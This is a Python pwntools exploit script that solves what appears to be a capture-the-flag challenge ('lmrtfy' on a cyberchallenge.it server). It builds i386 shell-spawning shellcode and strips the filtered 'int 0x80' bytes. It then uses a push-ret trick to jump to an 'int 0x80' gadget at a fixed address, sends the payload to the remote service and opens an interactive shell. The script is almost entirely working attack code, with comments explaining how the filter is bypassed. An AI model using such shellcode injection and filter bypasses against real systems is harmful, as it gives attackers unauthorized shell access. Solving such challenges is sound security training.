from pwn import *

context.binary = ELF('lmrtfy')


# The last two bytes of "sh()" are for 'int 0x80' which is forbidden
# but there is a gadget for 'int 0x80' at this specific address!
# NOTE: Since 'jmp' needs to be allocated in the program jump table, we can
#       simply use the "push-ret" trick to emulate this behaviour: simply
#       we push the address we want to jump to into the stack and then the
#       'ret' instruction jumps to that address ('ret' pops the first value
#       in the stack and stores it into $eip/$rip

payload = asm(shellcraft.i386.linux.sh())[:-2] + asm('push 0x08049444; ret')

"""
p = process()
p.send(payload)
p.interactive()
"""
p = remote('lmrtfy.challs.cyberchallenge.it', '9124')
p.send(payload)
p.interactive()
